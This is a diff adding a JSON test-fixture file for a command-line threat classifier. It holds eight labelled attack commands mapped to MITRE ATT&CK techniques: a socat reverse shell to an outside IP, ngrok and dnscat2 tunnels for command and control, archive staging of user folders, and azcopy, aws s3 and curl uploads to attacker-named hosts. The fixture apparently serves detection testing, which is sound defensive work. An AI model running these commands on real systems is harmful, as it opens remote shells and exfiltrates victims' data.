@@ -1,0 +1,98 @@
+[
+  {
+    "id": "ngrok-c2-tunnel",
+    "description": "ngrok used to expose internal C2 listener to the internet — reverse tunnel for command and control",
+    "source": "MITRE ATT&CK T1572 ; Mandiant blog 2023 https://www.mandiant.com/resources/blog/suspected-apt-actors-leverage-bypass-techniques-network-scanning",
+    "command": "ngrok tcp 4444 --authtoken abc123def456",
+    "expect": {
+      "classes": ["data_staging"],
+      "min_confidence": {"data_staging": "high"},
+      "techniques": ["T1572"]
+    },
+    "reject": {"classes": ["impact", "credential_theft", "dropper"]}
+  },
+  {
+    "id": "socat-reverse-shell",
+    "description": "socat creating a reverse shell back to attacker — bidirectional relay for interactive C2",
+    "source": "MITRE ATT&CK T1095, T1572 ; GTFOBins https://gtfobins.github.io/gtfobins/socat/",
+    "command": "socat TCP:185.220.101.34:4444 EXEC:/bin/bash,pty,stderr,setsid,sigint,sane",
+    "expect": {
+      "classes": ["data_staging"],
+      "min_confidence": {"data_staging": "high"},
+      "techniques": ["T1095", "T1572"]
+    },
+    "reject": {"classes": ["impact", "credential_theft"]}
+  },
+  {
+    "id": "azcopy-exfil-to-blob",
+    "description": "azcopy syncing sensitive files to attacker-controlled Azure Blob Storage — cloud exfiltration",
+    "source": "MITRE ATT&CK T1537 ; CISA AA23-144A Volt Typhoon",
+    "command": "azcopy copy \"C:\\Users\\Public\\documents\" \"https://attacker.blob.core.windows.net/exfil?sv=2020-08-04&ss=b\" --recursive",
+    "expect": {
+      "classes": ["data_staging"],
+      "min_confidence": {"data_staging": "medium"},
+      "techniques": ["T1537"]
+    },
+    "reject": {"classes": ["impact", "credential_theft", "loader"]}
+  },
+  {
+    "id": "7zip-password-staging",
+    "description": "7z password-protected archive of user home directory — data staging before exfiltration",
+    "source": "MITRE ATT&CK T1560.001 ; APT41 TTPs (MITRE ATT&CK G0096)",
+    "command": "7z.exe a -tzip -p\"S3cr3tP@ss\" -mhe C:\\Windows\\Temp\\archive.zip C:\\Users",
+    "expect": {
+      "classes": ["data_staging"],
+      "min_confidence": {"data_staging": "medium"},
+      "techniques": ["T1560", "T1560.001"]
+    },
+    "reject": {"classes": ["impact", "credential_theft"]}
+  },
+  {
+    "id": "winrar-staging-docs",
+    "description": "WinRAR compressing Documents and Desktop folders — data staging pattern before exfil",
+    "source": "MITRE ATT&CK T1560.001 ; Mandiant M-Trends 2022",
+    "command": "rar.exe a -hp\"P@ssw0rd!\" C:\\Windows\\Temp\\docs.rar C:\\Users\\Administrator\\Documents C:\\Users\\Administrator\\Desktop",
+    "expect": {
+      "classes": ["data_staging"],
+      "min_confidence": {"data_staging": "medium"},
+      "techniques": ["T1560", "T1560.001"]
+    },
+    "reject": {"classes": ["impact", "credential_theft"]}
+  },
+  {
+    "id": "curl-http-post-exfil",
+    "description": "curl HTTP POST uploading harvested data to attacker server — exfiltration via web protocol",
+    "source": "MITRE ATT&CK T1048, T1041 ; Red Canary 2023",
+    "command": "curl -X POST hxxps://collector.evil-domain[.]xyz/upload -F \"file=@C:\\Windows\\Temp\\loot.zip\" -H \"Authorization: Bearer abc123\"",
+    "expect": {
+      "classes": ["data_staging"],
+      "min_confidence": {"data_staging": "medium"},
+      "techniques": ["T1048", "T1041"]
+    },
+    "reject": {"classes": ["impact", "credential_theft"]}
+  },
+  {
+    "id": "aws-s3-sync-exfil",
+    "description": "aws s3 sync pushing local files to attacker-controlled S3 bucket — cloud exfiltration",
+    "source": "MITRE ATT&CK T1537 ; CISA AA22-277A",
+    "command": "aws s3 sync C:\\Users\\Administrator\\Documents s3://attacker-bucket-exfil/corp/ --region us-east-1",
+    "expect": {
+      "classes": ["data_staging"],
+      "min_confidence": {"data_staging": "medium"},
+      "techniques": ["T1537"]
+    },
+    "reject": {"classes": ["impact", "credential_theft", "loader"]}
+  },
+  {
+    "id": "dns-cat-tunneling",
+    "description": "dnscat2 DNS tunneling tool for covert C2 communication over DNS queries",
+    "source": "MITRE ATT&CK T1071.004, T1048.001 ; dnscat2 tool documentation",
+    "command": "dnscat --secret=abc123def456 --dns domain=c2.evil-domain[.]xyz,server=8.8.8.8",
+    "expect": {
+      "classes": ["data_staging"],
+      "min_confidence": {"data_staging": "high"},
+      "techniques": ["T1071.004", "T1048.001"]
+    },
+    "reject": {"classes": ["impact", "credential_theft", "loader"]}
+  }
+]
